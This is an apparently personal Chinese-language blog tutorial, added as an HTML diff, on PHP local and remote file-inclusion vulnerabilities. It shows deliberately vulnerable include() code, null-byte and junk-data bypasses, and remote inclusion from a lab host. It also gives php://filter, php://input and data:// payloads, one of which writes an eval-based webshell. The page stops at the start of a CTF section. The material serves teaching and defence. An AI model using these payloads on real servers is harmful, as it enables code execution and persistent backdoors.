@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="">
+  <title>Web安全-文件包含 | Love is a Moment Story</title>
+  <meta name="author" content="zhang rui" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Struts2漏洞复现总结" />
+  
+  <meta name="description" content="思维导图 2、文件包含原理文件包含一般是指源文件可以将另一个文件的全部内容包含进来。 其一般形式：#include “文件名” 或者 #include&lt;文件名&gt; 3、文件包含的条件 用户能够控制这个动态变量 include()等函数通过动态变量的方式引入需要包含的文件  4、文件包含漏洞的危害 敏感信息泄露 获取webshell 任意命令执行  5、文件包含漏洞修复 设置白名单 过滤危">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Web安全-文件包含">
+<meta property="og:url" content="http://example.com/2023/01/19/Web%E5%AE%89%E5%85%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="Love is a Moment Story">
+<meta property="og:description" content="思维导图 2、文件包含原理文件包含一般是指源文件可以将另一个文件的全部内容包含进来。 其一般形式：#include “文件名” 或者 #include&lt;文件名&gt; 3、文件包含的条件 用户能够控制这个动态变量 include()等函数通过动态变量的方式引入需要包含的文件  4、文件包含漏洞的危害 敏感信息泄露 获取webshell 任意命令执行  5、文件包含漏洞修复 设置白名单 过滤危">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/null">
+<meta property="article:published_time" content="2023-01-19T01:49:25.000Z">
+<meta property="article:modified_time" content="2023-01-19T06:21:32.651Z">
+<meta property="article:author" content="zhang rui">
+<meta property="article:tag" content="Struts2漏洞复现总结">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/null">
+<meta name="twitter:site" content="@null">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" type="text/css" media="all">
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" type="text/css" media="all">
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" type="text/css" media="all">
+  <link rel="stylesheet" id="nprogress-css" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" type="text/css" media="all">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+  
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-dark.min.css" type="text/css" media="all">
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Love is a Moment Story" type="application/atom+xml">
+</head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                        <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/coffee/"><i class="fa fa-coffee"></i>生活日常</a></li>
+                                    
+                                
+                                    
+                                        <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                    
+                                
+                                    
+                                        <li>
+                                            <a><i class="fa fa-paper-plane"></i>关于我</a>
+                                            <ul class="sub-menu">
+                                                
+                                                    
+                                                
+                                                    
+                                                        <li><a href="/about/">自我介绍</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://zr-blog.github.io/">作者博客</a></li>
+                                                    
+                                                
+                                                    
+                                                        <li><a target="_blank" rel="noopener" href="https://github.com/zr-blog">项目链接</a></li>
+                                                    
+                                                
+                                            </ul>
+                                        </li>
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Love is a Moment Story</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Love is a Moment Story</h2> <br />
+                        <span>im very vegatable and very poor</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article>
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center">Web安全-文件包含</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><i class="fa fa-calendar"></i> 2023-01-19</li>
+                <li><i class="fa fa-user"></i> 作者 zhang rui</li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~6.11K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                本文最后编辑于 <time datetime="1674109292651"></time> 前，其中的内容可能需要更新。
+            </div>
+            
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">思维导图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">2、文件包含原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">3、文件包含的条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-number">4.</span> <span class="toc-text">4、文件包含漏洞的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">5.</span> <span class="toc-text">5、文件包含漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E6%B6%89%E5%8F%8A%E5%8C%85%E5%90%AB%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">6.</span> <span class="toc-text">6、涉及包含的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA-%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB"><span class="toc-number">7.</span> <span class="toc-text">7、案例演示-本地包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#7-1%E3%80%81%E6%97%A0%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">7.1.</span> <span class="toc-text">7.1、无限制文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-2%E3%80%81%E6%9C%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">7.2.</span> <span class="toc-text">7.2、有限制文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-number">8.</span> <span class="toc-text">8、案例演示-远程包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#8-1%E3%80%81%E6%9D%A1%E4%BB%B6"><span class="toc-number">8.1.</span> <span class="toc-text">8.1、条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-2%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%90%84%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-number">8.2.</span> <span class="toc-text">8.2、文件包含的各种写法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-3%E3%80%81%E5%8D%8F%E8%AE%AE%E7%8E%A9%E6%B3%95"><span class="toc-number">8.3.</span> <span class="toc-text">8.3、协议玩法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81CTF-%E5%8D%97%E9%82%AE%E6%9D%AF"><span class="toc-number">9.</span> <span class="toc-text">9、CTF-南邮杯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81ekucms-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">10.</span> <span class="toc-text">10、ekucms-文件包含</span></a></li></ol>
+                </div>
+            
+            <hr />
+            <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922655_63b6c61f97ba25c06fa2e.png!small" alt="图片.png"></p>
+<h2 id="2、文件包含原理"><a href="#2、文件包含原理" class="headerlink" title="2、文件包含原理"></a>2、文件包含原理</h2><p>文件包含一般是指源文件可以将另一个文件的全部内容包含进来。</p>
+<p>其一般形式：#include “文件名” 或者 #include&lt;文件名&gt;</p>
+<h2 id="3、文件包含的条件"><a href="#3、文件包含的条件" class="headerlink" title="3、文件包含的条件"></a>3、文件包含的条件</h2><ul>
+<li>用户能够控制这个动态变量</li>
+<li>include()等函数通过动态变量的方式引入需要包含的文件</li>
+</ul>
+<h2 id="4、文件包含漏洞的危害"><a href="#4、文件包含漏洞的危害" class="headerlink" title="4、文件包含漏洞的危害"></a>4、文件包含漏洞的危害</h2><ul>
+<li>敏感信息泄露</li>
+<li>获取webshell</li>
+<li>任意命令执行</li>
+</ul>
+<h2 id="5、文件包含漏洞修复"><a href="#5、文件包含漏洞修复" class="headerlink" title="5、文件包含漏洞修复"></a>5、文件包含漏洞修复</h2><ul>
+<li>设置白名单</li>
+<li>过滤危险字符</li>
+<li>设置文件目录</li>
+<li>关闭危险配置</li>
+</ul>
+<h2 id="6、涉及包含的危险函数"><a href="#6、涉及包含的危险函数" class="headerlink" title="6、涉及包含的危险函数"></a>6、涉及包含的危险函数</h2><p>PHP：include()，include_once()，require()，require_once()，fopen()，readfile()<br>JSP/Servlet：ava.io.file()，java.io.filereader()<br>ASP：include file，include virtual</p>
+<p>include()：包含并运行指定的文件，包含文件发生错误时，程序警告，但会继续执行。</p>
+<p>require()：包含并运行指定的文件，包含文件发生错误时，程序直接终止执行。</p>
+<p>include_once()：和 include 类似，不同处在于 include_once 会检查这个文件是否已经被导入，如果已导入，下文便不会再导入，直面 once 理解就是只导入一次。</p>
+<p>require_once()：和 require 类似，不同处在于 require_once 只导入一次。</p>
+<p>php.ini配置文件：allow_url_fopen=off即不可以包含远程文件，php4存在远程包含和本地包含，php5仅存在本地包含。</p>
+<p>使用上面几个函数包含文件时，该文件作为PHP代码执行，PHP内核并不在意被包含的文件是什么类型，也就是说我们这几个函数包含.jpg文件时，也会将其当作php文件来执行。</p>
+<h2 id="7、案例演示-本地包含"><a href="#7、案例演示-本地包含" class="headerlink" title="7、案例演示-本地包含"></a>7、案例演示-本地包含</h2><h3 id="7-1、无限制文件包含"><a href="#7-1、无限制文件包含" class="headerlink" title="7.1、无限制文件包含"></a>7.1、无限制文件包含</h3><p>include.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include ( $filename);</span><br><span class="line">//http://127.0.0.1:8080/include.php?filename=index.txt</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>index.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922674_63b6c63234da55b7d7fa7.png!small" alt="图片.png"></p>
+<h3 id="7-2、有限制文件包含"><a href="#7-2、有限制文件包含" class="headerlink" title="7.2、有限制文件包含"></a>7.2、有限制文件包含</h3><p>include.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">include ( $filename .&quot; .html&quot; );</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>index.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922685_63b6c63d4a4de4453a6eb.png!small" alt="图片.png"><br>%00绕过</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922693_63b6c64506f4d91a5298d.png!small" alt="图片.png"><br>垃圾数据绕过</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922699_63b6c64b592878a54ec8c.png!small" alt="图片.png"></p>
+<h2 id="8、案例演示-远程包含"><a href="#8、案例演示-远程包含" class="headerlink" title="8、案例演示-远程包含"></a>8、案例演示-远程包含</h2><h3 id="8-1、条件"><a href="#8-1、条件" class="headerlink" title="8.1、条件"></a>8.1、条件</h3><p>如果php.ini的配置选项allow_url_fopen，allow_url_include都为ON的话，文件包含函数是可以加载远程文件的，这种漏洞就被称为远程文件包含。利用这个漏洞，可以直接执行任意命令。</p>
+<p>allow_url_fopen 是否允许打开URL文件</p>
+<p>allow_url_include 是否允许引用URL文件</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922710_63b6c656489d7dd3238eb.png!small" alt="图片.png"></p>
+<h3 id="8-2、文件包含的各种写法"><a href="#8-2、文件包含的各种写法" class="headerlink" title="8.2、文件包含的各种写法"></a>8.2、文件包含的各种写法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include $_GET[]</span><br><span class="line">include $_GET[].”.inc”</span><br><span class="line">include “./“.$_GET[]</span><br><span class="line">include “./include”.$_GET[]</span><br><span class="line">include “./include”.$_GET[].”.inc”</span><br></pre></td></tr></table></figure>
+
+<p>在远程服务器上创建readme.txt并访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922718_63b6c65ea151b480d99fa.png!small" alt="图片.png"><br>访问：<a target="_blank" rel="noopener" href="http://127.0.0.1/include.php/?filename=http://192.168.192.131/index.txt">http://127.0.0.1/include.php/?filename=http://192.168.192.131/index.txt</a></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922724_63b6c66439bf8a704bd1e.png!small" alt="图片.png"></p>
+<h3 id="8-3、协议玩法"><a href="#8-3、协议玩法" class="headerlink" title="8.3、协议玩法"></a>8.3、协议玩法</h3><p>大佬总结：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>
+<p>PHP支持的伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
+
+<p><strong>8.3.1、php.ini参数设置</strong></p>
+<p>在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。</p>
+<p>allow_url_fopen:默认值是ON。允许url里的封装协议访问文件。</p>
+<p>allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件。</p>
+<p><strong>8.3.2、各个协议的利用条件和方法</strong></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922737_63b6c671ee41bc50a2628.png!small" alt="图片.png"></p>
+<p><strong>8.3.3、php://input</strong></p>
+<p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
+<p><strong>注：当enctype=”multipart/form-data”时，php://input是无效的。</strong></p>
+<p><strong>8.3.4、file://</strong></p>
+<p>用于访问本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。</p>
+<p>用法：</p>
+<p>1、file://[文件的绝对路径和文件名]<br><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=file://D:%5CphpStudy%5CWWW%5Cindex.txt">http://127.0.0.1/include.php?file=file://D:\phpStudy\WWW\index.txt</a><br>2、[文件的相对路径和文件名]<br><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=./index.txt">http://127.0.0.1/include.php?file=./index.txt</a></p>
+<p><strong>8.3.5、http:// https://</strong></p>
+<p>URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源，通常用于远程包含。</p>
+<p>用法：</p>
+<p>[http://网络路径和文件名]<a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=http://127.0.0.1/index.txt">http://127.0.0.1/include.php?file=http://127.0.0.1/index.txt</a></p>
+<p><strong>8.3.6、php://</strong></p>
+<p>php:// 用于访问各个输入/输出流（I/O streams），经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
+<table>
+<thead>
+<tr>
+<th align="center">协议</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">php://input</td>
+<td align="center">可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=”multipart/form-data” 的时候php://input 是无效的。</td>
+</tr>
+<tr>
+<td align="center">php://output</td>
+<td align="center">只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
+</tr>
+<tr>
+<td align="center">php://fd</td>
+<td align="center">(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</td>
+</tr>
+<tr>
+<td align="center">php://memory php://temp</td>
+<td align="center">(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</td>
+</tr>
+<tr>
+<td align="center">php://filter</td>
+<td align="center">(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</td>
+</tr>
+</tbody></table>
+<p><strong>8.3.7、php://filter参数详解</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">resource=&lt;要过滤的数据流&gt;</td>
+<td align="center">必须项。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td align="center">read=&lt;读链的过滤器&gt;</td>
+<td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>
+</tr>
+<tr>
+<td align="center">write=&lt;写链的筛选列表&gt;</td>
+<td align="center">该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td>
+</tr>
+<tr>
+<td align="center">&lt;; 两个链的过滤器&gt;</td>
+<td align="center">任何没有以 read=或 write=作前缀的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<p><strong>8.3.8、可用的过滤器列表（4类）</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">字符串过滤器</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">string.rot13</td>
+<td align="center">等同于str_rot13()，rot13变换</td>
+</tr>
+<tr>
+<td align="center">string.toupper</td>
+<td align="center">等同于strtoupper()，转大写字母</td>
+</tr>
+<tr>
+<td align="center">string.tolower</td>
+<td align="center">等同于strtolower()，转小写字母</td>
+</tr>
+<tr>
+<td align="center">string.strip_tags</td>
+<td align="center">等同于strip_tags()，去除html、PHP语言标签</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">转换过滤器</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">convert.base64-encode &amp; convert.base64-decode</td>
+<td align="center">等同于base64_encode()和base64_decode()，base64编码解码</td>
+</tr>
+<tr>
+<td align="center">convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
+<td align="center">quoted-printable 字符串与 8-bit 字符串编码解码</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">压缩过滤器</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">zlib.deflate &amp; zlib.inflate</td>
+<td align="center">在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
+</tr>
+<tr>
+<td align="center">bzip2.compress &amp; bzip2.decompress</td>
+<td align="center">同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">加密过滤器</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">mcrypt.*</td>
+<td align="center">libmcrypt 对称加密算法</td>
+</tr>
+<tr>
+<td align="center">mdecrypt.*</td>
+<td align="center">libmcrypt 对称解密算法</td>
+</tr>
+</tbody></table>
+<p><strong>8.3.9、读取文件源码的用法</strong></p>
+<p>php://filter/read=convert.base64-encode/resource=[文件名]</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</a></p>
+<p><strong>8.3.10、执行php代码用法</strong></p>
+<p>php://input + [POST DATA]</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=php://input">http://127.0.0.1/include.php?file=php://input</a><br>[POST DATA部分]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>8.3.11、写入一句话木马</strong></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=php://input">http://127.0.0.1/include.php?file=php://input</a><br>[POST DATA部分]</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>8.3.12、phar://、zip://、bzip2://、zlib://</strong></p>
+<p>用于读取压缩文件，zip:// 、 bzip2:// 、 zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</p>
+<p>phar://<a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</a></p>
+<p><strong>8.3.13、data://</strong></p>
+<p>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
+<p>1、data://text/plain,<br><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=data://text/plain,%60">http://127.0.0.1/include.php?file=data://text/plain,`</a><?php phpinfo();?>`</p>
+<p>2、data://text/plain;base64,<br><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</a></p>
+<p><strong>8.3.14、filter演示</strong></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?filename=php://filter/read=convert.base64-encode/resource=index.txt">http://127.0.0.1/include.php?filename=php://filter/read=convert.base64-encode/resource=index.txt</a></p>
+<p>读取本地index.txt以base64进行加密</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922770_63b6c69241776b36704db.png!small" alt="图片.png"></p>
+<p>解密后：</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922775_63b6c6975ff3068fca8ad.png!small" alt="图片.png"></p>
+<p><strong>8.3.15、input演示</strong></p>
+<p>应该是当enctype=”multipart/form-data”时，php://input是无效的。</p>
+<p><strong>8.3.16、file演示</strong></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?filename=file://D:%5CphpStudy%5CWWW%5Cindex.txt">http://127.0.0.1/include.php?filename=file://D:\phpStudy\WWW\index.txt</a></p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922785_63b6c6a12c00b0993f1e0.png!small" alt="图片.png"></p>
+<p><strong>8.3.17、data演示</strong></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?filename=data://text/plain,%60">http://127.0.0.1/include.php?filename=data://text/plain,`</a><?php phpinfo();?>`</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922801_63b6c6b1caa6f2cf48655.png!small" alt="图片.png"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/include.php?filename=data://text/plain,%60">http://127.0.0.1/include.php?filename=data://text/plain,`</a><?php system(dir);?>`</p>
+<p><img src="https://raw.githubusercontent.com/zrzuishuai/tuchuang/main/blog/1672922809_63b6c6b9a4d82c8d76020.png!small" alt="图片.png"></p>
+<h2 id="9、CTF-南邮杯"><a href="#9、CTF-南邮杯" class="headerlink" title="9、CTF-南邮杯"></a>9、CTF-南邮杯</h2><p>CTF链接：<code>http://4.chinalover.sinaapp.com/web7/index.php</code></p>
